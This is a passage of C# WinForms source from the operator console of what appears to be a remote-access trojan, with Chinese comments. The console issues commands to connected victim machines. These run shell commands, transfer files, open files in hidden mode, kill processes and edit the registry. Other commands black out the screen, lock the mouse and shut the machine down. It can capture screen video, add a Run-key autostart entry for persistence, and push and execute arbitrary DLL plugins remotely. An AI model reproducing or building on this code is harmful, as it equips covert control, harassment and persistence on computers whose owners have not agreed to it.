                    fs.Dispose();
                    fs = null;

                    MsgBox.ShowInfo("上传完成!");
                }
                if (frm != null)
                {
                    frm.Close();
                    frm.Dispose();
                    frm = null;
                }
            }
        }

        /// <summary>
        /// 下载文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton14_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            if (this.currentSession != null)
            {
                ListViewItem selectedItem = this.listView1.SelectedItems[0];
                ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;
                if (tag.IsFile == false)
                {
                    MessageBox.Show("暂时不支持文件夹下载！");
                    return;
                }

                string fileName = System.IO.Path.GetFileName(tag.Path);
                var sfd = new SaveFileDialog();
                sfd.FileName = fileName;
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.Cancel)
                    return;

                var req = new RequestStartDownload();
                req.Path = tag.Path;
                req.SavePath = sfd.FileName;
                this.currentSession.Send(ePacketType.PACKET_START_DOWNLOAD_REQUEST, req);
            }
        }

        /// <summary>
        /// 发送cmd命令
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonSendCommand_Click(object sender, EventArgs e)
        {
            RequestCommand req = new RequestCommand();
            req.Command = this.textBoxCommandRequest.Text;

            PostRequstWithCurrentSession(ePacketType.PACKET_COMMAND_REQUEST, req);

            this.textBoxCommandRequest.Clear();
        }

        /// <summary>
        /// 回车发送命令
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxCommandRequest_KeyUp(object sender, KeyEventArgs e)
        {
            bool sendCommand = false;
            if (this.sendCommandHotKey == SendCommandHotKey.Enter)
            {
                if (!e.Control && e.KeyCode == Keys.Enter)
                {
                    sendCommand = true;
                }
            }
            else if (this.sendCommandHotKey == SendCommandHotKey.CtrlEnter)
            {
                if (e.Control && e.KeyCode == Keys.Enter)
                {
                    sendCommand = true;
                }
            }

            if (sendCommand)
            {
                buttonSendCommand_Click(null, null);
                e.Handled = true;
            }
        }

        /// <summary>
        /// 对当前会话发送数据包
        /// </summary>
        /// <param name="packetType"></param>
        /// <param name="reqObj"></param>
        private void PostRequstWithCurrentSession(ePacketType packetType, object reqObj)
        {
            if (this.currentSession == null)
                return;
            this.currentSession.Send(packetType, reqObj);
        }

        /// <summary>
        /// 锁定计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonLockComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.ShowOkCancel("确定要锁定计算机:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_LOCK_REQUEST, null);
        }

        /// <summary>
        /// 重启计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonRebootComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.ShowOkCancel("确定要重启计算机:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_REBOOT_REQUEST, null);
        }

        /// <summary>
        /// 睡眠计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonSleepComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.ShowOkCancel("确定要睡眠计算机:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_SLEEP_REQUEST, null);
        }

        /// <summary>
        /// 关闭计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonShutdownComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.ShowOkCancel("确定要关闭计算机:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_SHUTDOWN_REQUEST, null);
        }

        /// <summary>
        /// 休眠计算机
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonHibernateComputer_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            if (MsgBox.ShowOkCancel("确定要休眠计算机:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_HIBERNATE_REQUEST, null);
        }

        /// <summary>
        /// 选择发送命令模式
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonSelectSendCmdMode_Click(object sender, EventArgs e)
        {
            ContextMenuStrip cms = new ContextMenuStrip();

            ToolStripMenuItem enterMenuItem = new ToolStripMenuItem("Enter 发送", null, (o, args) =>
                {
                    for (int i = 0; i < cms.Items.Count; i++)
                    {
                        var control = cms.Items[i];
                        if (control is ToolStripMenuItem)
                        {
                            (control as ToolStripMenuItem).Checked = false;
                        }
                    }
                    (o as ToolStripMenuItem).Checked = true;
                    this.sendCommandHotKey = SendCommandHotKey.Enter;
                });
            enterMenuItem.Checked = this.sendCommandHotKey == SendCommandHotKey.Enter;
            cms.Items.Add(enterMenuItem);

            ToolStripMenuItem altEnterMenuItem = new ToolStripMenuItem("Ctrl+Enter 发送", null, (o, args) =>
            {
                for (int i = 0; i < cms.Items.Count; i++)
                {
                    var control = cms.Items[i];
                    if (control is ToolStripMenuItem)
                    {
                        (control as ToolStripMenuItem).Checked = false;
                    }
                }
                (o as ToolStripMenuItem).Checked = true;
                this.sendCommandHotKey = SendCommandHotKey.CtrlEnter;
            });
            altEnterMenuItem.Checked = this.sendCommandHotKey == SendCommandHotKey.CtrlEnter;
            cms.Items.Add(altEnterMenuItem);
            Point location = this.buttonSelectSendCmdMode.PointToClient(Control.MousePosition);
            cms.Show(this.buttonSelectSendCmdMode, location);
        }

        /// <summary>
        /// 当前会话是否有效
        /// </summary>
        /// <returns></returns>
        private bool IsCurrentSessionValid()
        {
            if (this.currentSession == null)
            {
                MsgBox.ShowInfo("请先选择一台计算机");
                return false;
            }

            return true;
        }

        /// <summary>
        /// 打开网址
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonOpenUrl_Click(object sender, EventArgs e)
        {
            var frm = new FrmInputUrl();
            frm.Owner = this;
            frm.FormClosed += (o, args) =>
                {
                    FrmInputUrl myFrm = o as FrmInputUrl;
                    if (myFrm.InputText == null)
                        return;
                    RequestOpenUrl req = new RequestOpenUrl();
                    req.Url = myFrm.InputText;
                    PostRequstWithCurrentSession(ePacketType.PACKET_OPEN_URL_REQUEST, req);
                };
            frm.Show();
        }

        private void buttonSendMessage_Click(object sender, EventArgs e)
        {
            var frm = new FrmSendMessage();
            frm.Owner = this;
            frm.FormClosing += (o, args) =>
                {
                    var myFrm = o as FrmSendMessage;
                    if (myFrm.Request == null)
                        return;

                    PostRequstWithCurrentSession(ePacketType.PACKET_MESSAGEBOX_REQUEST, myFrm.Request);
                };
            frm.Show();
        }

        private void buttonLockMouse_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmInputUrl();
            frm.Text = "请输入要锁定鼠标的时间（单位：秒）";
            frm.FormClosing += (o, args) =>
                {
                    if (frm.InputText == null)
                        return;
                    int seconds;
                    if (!int.TryParse(frm.InputText, out seconds))
                    {
                        MsgBox.ShowInfo("必须输入数字!");
                        return;
                    }
                    RequestLockMouse req = new RequestLockMouse();
                    req.LockSeconds = seconds;
                    PostRequstWithCurrentSession(ePacketType.PACKET_LOCK_MOUSE_REQUEST, req);
                };
            frm.Show();
        }

        private void buttonUnLockMouse_Click(object sender, EventArgs e)
        {
            if (MsgBox.ShowOkCancel("确定要取消锁定鼠标:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, null);
        }

        private void buttonBlackScreen_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, null);
        }

        private void buttonUnBlackScreen_Click(object sender, EventArgs e)
        {
            if (MsgBox.ShowOkCancel("确定要取消黑屏:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, null);
        }

        private void buttonOpenCD_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PACKET_OPEN_CD_REQUEST, null);
        }

        private void buttonCloseCD_Click(object sender, EventArgs e)
        {
            PostRequstWithCurrentSession(ePacketType.PACKET_CLOSE_CD_REQUEST, null);
        }

        private void buttonPlayMusic_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmInputUrl();
            frm.Text = "请输入音乐文件全路径";
            frm.FormClosing += (o, args) =>
            {
                if (frm.InputText == null)
                    return;

                RequestPlayMusic req = new RequestPlayMusic();
                req.MusicFilePath = frm.InputText;
                PostRequstWithCurrentSession(ePacketType.PACKET_PLAY_MUSIC_REQUEST, req);
            };
            frm.Show();
        }

        private void buttonStopPlayMusic_Click(object sender, EventArgs e)
        {
            if (MsgBox.ShowOkCancel("确定要停止播放音乐:" + this.currentSession.SocketId) == System.Windows.Forms.DialogResult.Cancel)
                return;

            PostRequstWithCurrentSession(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, null);
        }

        private void buttonRemoteDownloadWebUrl_Click(object sender, EventArgs e)
        {
            if (!IsCurrentSessionValid())
                return;

            var frm = new FrmDownloadWebFile();
            frm.FormClosing += (o, args) =>
            {
                if (frm.WebUrl == null || frm.DestFilePath==null)
                    return;

                RequestDownloadWebFile req = new RequestDownloadWebFile();
                req.WebFileUrl = frm.WebUrl;
                req.DestinationPath = frm.DestFilePath;
                PostRequstWithCurrentSession(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, req);
            };
            frm.Show();
        }

        private string GetFileSizeDesc(long size)
        {
            string result = string.Empty;

            if (size > 1000 * 1000 * 1000)
            {
                result = (size * 1.0 / 1000 / 1000 / 1000).ToString("0.000") + " GB";
            }
            else if (size > 1000 * 1000)
            {
                result = (size * 1.0 / 1000 / 1000).ToString("0.000") + " MB";
            }
            else if (size > 1000)
            {
                result = (size * 1.0 / 1000).ToString("0.000") + " KB";
            }
            else
            {
                result = size + " byte";
            }

            return result;
        }

        #region 文件管理右键菜单

        private void 刷新ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.Tag == null)
                return;

            RequestGetSubFilesOrDirs req = new RequestGetSubFilesOrDirs();
            req.parentDir = this.listView1.Tag.ToString();

            PostRequstWithCurrentSession(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
        }

        private void 复制全路径ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            ListViewItem selectedItem = this.listView1.SelectedItems[0];
            ListViewItemFileOrDirTag tag = selectedItem.Tag as ListViewItemFileOrDirTag;

            try
            {
                Clipboard.SetText(tag.Path);
            }
            catch (Exception ex)
            {
                MsgBox.ShowInfo("复制到剪切板失败！");
            }
        }

        private void 打开文件ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(this.listView1.SelectedItems.Count<1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.ShowInfo("请选择一个文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestOpenFile req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = false;
                this.currentSession.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }

        private void 打开文件隐藏模式ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.ShowInfo("请选择一个文件！");
                return;
            }

            if (this.currentSession != null)
            {
                RequestOpenFile req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = true;
                this.currentSession.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }

        #endregion

        #region 进程管理右键菜单

        private void 刷新ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.PostRequstWithCurrentSession(ePacketType.PACKET_GET_PROCESSES_REQUEST, null);
        }

        private void 结束进程ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.listView3.SelectedItems.Count < 1)
            {
                MsgBox.ShowInfo("请先选择进程！");
                return;
            }
            RequestKillProcesses req = new RequestKillProcesses();
            req.ProcessIds = new List<string>();
            for (int i = 0; i < this.listView3.SelectedItems.Count; i++)
            {
                var item = this.listView3.SelectedItems[i];
                var processId = item.SubItems[1].Text.Trim();
                req.ProcessIds.Add(processId);
            }

            this.PostRequstWithCurrentSession(ePacketType.PACKET_KILL_PROCESS_REQUEST, req);
        } 

        #endregion

        private void toolStripButtonCaptureVideo_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.ShowInfo("请先选择客户端！");
                return;
            }
            var frm = new FrmCaptureVideo(this.currentSession);
            string sessionId = this.currentSession.SocketId;
            if (!this.sessionVideoHandlers.ContainsKey(sessionId))
            {
                this.sessionVideoHandlers.Add(sessionId, frm.HandleScreen);
            }
            else
            {
                this.sessionVideoHandlers[sessionId] = frm.HandleScreen;
            }
            frm.Show();;
        }

        private void toolStripButtonSettings_Click(object sender, EventArgs e)
        {
            var frm = new FrmSettings();
            frm.Owner = this;
            frm.Show();
        }

        private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            Settings.SaveSettings();
        }

        private void 配置服务程序ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            toolStripButtonSettings_Click(null, null);
        }

        private void 关于ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        /// <summary>
        /// 复制按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton7_Click(object sender, EventArgs e)
        { 
            if (this.listView1.SelectedItems.Count < 1)
            {
                MsgBox.ShowInfo("请选择一个文件！");
                return;
            }

            string path;
            if(!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.ShowInfo("不支持文件夹的复制！");
                return;
            }

            PasteInfo pi = toolStripButton8.Tag as PasteInfo;
            if (pi == null)
            {
                pi = new PasteInfo();
                toolStripButton8.Tag = pi;
            }
            pi.IsDeleteSourceFile = false;
            pi.SourceFilePath = path;
        }

        /// <summary>
        /// 剪切按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton12_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
            {
                MsgBox.ShowInfo("请选择一个文件！");
                return;
            }

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.ShowInfo("不支持文件夹的剪切！");
                return;
            }

            PasteInfo pi = toolStripButton8.Tag as PasteInfo;
            if (pi == null)
            {
                pi = new PasteInfo();
                toolStripButton8.Tag = pi;
            }
            pi.IsDeleteSourceFile = true;
            pi.SourceFilePath = path;
        }

        /// <summary>
        /// 粘贴按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton8_Click(object sender, EventArgs e)
        {
            PasteInfo pi = toolStripButton8.Tag as PasteInfo;
            if (pi == null)
            {
                MsgBox.ShowInfo("请先复制或移动一个文件！");
                return;
            }

            string pastMode = pi.IsDeleteSourceFile ? "移动" : "复制";
            string curDir = this.listView1.Tag as string;
            if (curDir == null)
            {
                MsgBox.ShowInfo("不能" + pastMode + "到当前目录！");
                return;
            }
            if (MsgBox.ShowOkCancel("确定要" + pastMode + "文件" + pi.SourceFilePath + "?") == System.Windows.Forms.DialogResult.Cancel)
                return;
            string fileName = Path.GetFileName(pi.SourceFilePath);
            string destPath = Path.Combine(curDir, fileName);
            if (pi.IsDeleteSourceFile)
            {
                // move
                RequestMoveFile req = new RequestMoveFile();
                req.SourceFile = pi.SourceFilePath;
                req.DestinationFile = destPath;
                this.currentSession.Send(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, req);
            }
            else
            {
                // copy
                RequestCopyFile req = new RequestCopyFile();
                req.SourceFile = pi.SourceFilePath;
                req.DestinationFile = destPath;
                this.currentSession.Send(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, req);
            }
        }

        /// <summary>
        /// listivew节点是否为文件
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private bool IsListViewItemAFile(ListViewItem item, out string path)
        {
            ListViewItemFileOrDirTag tag = item.Tag as ListViewItemFileOrDirTag;
            path = tag.Path;
            if (tag.IsFile == false)
            {
                return false;
            }

            return true;
        }

        /// <summary>
        /// listview按键监控
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                toolStripButton9.PerformClick();
            }
            else if (e.KeyCode == Keys.C && e.Control)
            {
                toolStripButton7.PerformClick();
            }
            else if (e.KeyCode == Keys.X && e.Control)
            {
                toolStripButton12.PerformClick();
            }
            else if (e.KeyCode == Keys.V && e.Control)
            {
                toolStripButton8.PerformClick();
            }
            else if (e.KeyCode == Keys.F2)
            {
                toolStripButton2.PerformClick();
            }
        }

        /// <summary>
        /// 重命名按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
            {
                MsgBox.ShowInfo("请选择一个文件！");
                return;
            }

            string path;
            if (!IsListViewItemAFile(this.listView1.SelectedItems[0], out path))
            {
                MsgBox.ShowInfo("不支持文件夹的重命名！");
                return;
            }

            string oldName = System.IO.Path.GetFileName(path);
            var frm = new FrmRename(oldName);
            if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                RequestRenameFile req = new RequestRenameFile();
                req.SourceFile = path;
                req.DestinationFileName = frm.NewName;
                this.currentSession.Send(ePacketType.PACKET_RENAME_FILE_REQUEST, req);
            }

        }

        /// <summary>
        /// 树控件右键菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button != System.Windows.Forms.MouseButtons.Right)
                return;

            TreeViewHitTestInfo ti = treeView1.HitTest(e.Location);
            if (ti != null && 
                ti.Node != null &&
                ti.Node.Level == 1)
            {
                SocketSession client = ti.Node.Tag as SocketSession;
                if (client != null)
                {
                    ContextMenuStrip cms = new ContextMenuStrip();
                    cms.Items.Add("结束客户端程序", null, (o, s) =>
                    {
                        client.Send(ePacketType.PACKET_QUIT_APP_REQUEST, null);
                    });
                    cms.Items.Add("重启客户端程序", null, (o, s) =>
                    {
                        client.Send(ePacketType.PACKET_RESTART_APP_REQUEST, null);
                    });
                    cms.Items.Add("添加开启自启", null, (o, s) =>
                    {
                        RequestOpeRegistryValueName req = new RequestOpeRegistryValueName();
                        req.KeyRoot = eRegistryHive.CurrentUser;
                        req.KeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                        req.Operation = OpeType.New;
                        req.ValueName = "rc";
                        req.Value = client.AppPath;
                        client.Send(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, req);
                    });
                    cms.Items.Add("移除开启自启", null, (o, s) =>
                    {
                        RequestOpeRegistryValueName req = new RequestOpeRegistryValueName();
                        req.KeyRoot = eRegistryHive.CurrentUser;
                        req.KeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                        req.Operation = OpeType.Delete;
                        req.ValueName = "rc";
                        client.Send(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, req);
                    });
                    cms.Show(this.treeView1, e.Location);
                }
            }
        }

        /// <summary>
        /// “执行代码”按钮点击事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void buttonExeCode_Click(object sender, EventArgs e)
        {
            if (this.currentSession == null)
            {
                MsgBox.ShowInfo("请先选择客户端！");
                return;
            }
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "请选择代码插件";
            ofd.Filter = "代码插件(*.dll)|*.dll|所有文件(*.*)|*.*";
            ofd.FilterIndex = 1;
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                string codeFile = ofd.FileName;
                if (!PluginLoader.IsPlugin(codeFile))
                {
                    MsgBox.ShowInfo("非代码插件！");
                    return;
                }

                new Thread(() => {
                    string codeId = Guid.NewGuid().ToString();
                    System.IO.FileStream fs = new FileStream(codeFile, FileMode.Open, FileAccess.Read);
                    byte[] buffer = new byte[1024];
                    while (true)
                    {
                        int size = fs.Read(buffer, 0, buffer.Length);
                        if (size < 1)
                            break;
                        RequestTransportExecCode req = new RequestTransportExecCode();
                        req.Data = new byte[size];
                        for (int i = 0; i < req.Data.Length; i++)
                        {
                            req.ID = codeId;
                            req.Data[i] = buffer[i];
                        }
                        this.currentSession.Send(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, req);
                    }
                    fs.Close();
                    fs.Dispose();
                    this.currentSession.Send(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, new RequestRunExecCode() { ID=codeId });
                    MsgBox.ShowInfo("代码插件已经提交到客户端，等待执行！");
                }) { IsBackground = true }.Start();
            }
        }

        private void 退出XToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        /// <summary>
        /// 双击注册表项
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (e.Button != System.Windows.Forms.MouseButtons.Left)
                return;

            if (this.currentSession == null)
                return;

            TreeViewHitTestInfo ti = this.treeView2.HitTest(e.Location);
            if (ti != null && ti.Node != null)
            {
                RequestViewRegistryKey req = new RequestViewRegistryKey();
                if (ti.Node.Level == 0)
                {
                    return;
                }
                else if (ti.Node.Level == 1)
                {
                    // 根节点
                    eRegistryHive keyRoot = (eRegistryHive)Enum.Parse(typeof(eRegistryHive), ti.Node.Tag as string);
                    req.KeyRoot = keyRoot;
                    req.KeyPath = null;
                }
                else
                {
                    // 非根节点
                    req = ti.Node.Tag as RequestViewRegistryKey;
                }
                // 在listview上标注当前的key节点
                this.listView2.Tag = req;
                this.textBoxRegistryPath.Text = "计算机\\" + req.KeyRoot + "\\" + req.KeyPath;
                this.currentSession.Send(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, req);
            }
        }

        /// <summary>
        /// 注册表项右键菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView2_MouseUp(object sender, MouseEventArgs e)
        {
            if(e.Button!= System.Windows.Forms.MouseButtons.Right)
                return;

            ContextMenuStrip cms = new System.Windows.Forms.ContextMenuStrip();
            cms.Items.Add("切换", null, (o, args) => {
                if (this.currentSession == null)
                    return;

                TreeViewHitTestInfo ti = this.treeView2.HitTest(e.Location);
                if (ti != null && ti.Node != null)
                {
                    RequestViewRegistryKey req = new RequestViewRegistryKey();
                    if (ti.Node.Level == 0)
                    {
                        return;
                    }
                    else if (ti.Node.Level == 1)
                    {
                        // 根节点
                        eRegistryHive keyRoot = (eRegistryHive)Enum.Parse(typeof(eRegistryHive), ti.Node.Tag as string);
                        req.KeyRoot = keyRoot;
                        req.KeyPath = null;
                    }
                    else
                    {
                        // 非根节点
                        req = ti.Node.Tag as RequestViewRegistryKey;
                    }
                    var frm = new FrmInputUrl();
                    frm.Text = "请输入注册表相对地址";
                    frm.ShowDialog();
                    if (frm.InputText!=null)
                    {
                        if (req.KeyPath == null)
                        {
                            req.KeyPath = frm.InputText;
                        }
                        else
                        {
                            req.KeyPath += "\\" + frm.InputText;
                        }
                        this.currentSession.Send(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, req);
                    }
                }

                
            });
            cms.Show(sender as TreeView, e.Location);

        }

        /// <summary>
        /// 注册表值操作菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView2_MouseUp(object sender, MouseEventArgs e)
        {
            if (this.currentSession == null)
                return;

            if (e.Button == System.Windows.Forms.MouseButtons.Right)
            {
                var key = this.listView2.Tag as RequestViewRegistryKey;
                if (key != null)
                {
                    if (this.listView2.SelectedItems.Count > 0)
                    {
                        string valueName = this.listView2.SelectedItems[0].Text;
                        var req = new RequestOpeRegistryValueName();
                        req.KeyRoot = key.KeyRoot;
                        req.KeyPath = key.KeyPath;
                        req.ValueName = valueName;

                        ContextMenuStrip cms = new ContextMenuStrip();
                        cms.Items.Add("删除", null, (o, args) =>
                        {
                            req.Operation = OpeType.Delete;
                            this.currentSession.Send(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, req);
                        });
                        cms.Show(this.listView2, e.Location);
                    }
                    else
                    {
                        ContextMenuStrip cms = new ContextMenuStrip();
                        cms.Items.Add("刷新", null, (o, args) =>
                        {
                            this.currentSession.Send(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, key);
                        });
                        cms.Show(this.listView2, e.Location);
                    }
                }
            }
        }
    }
}
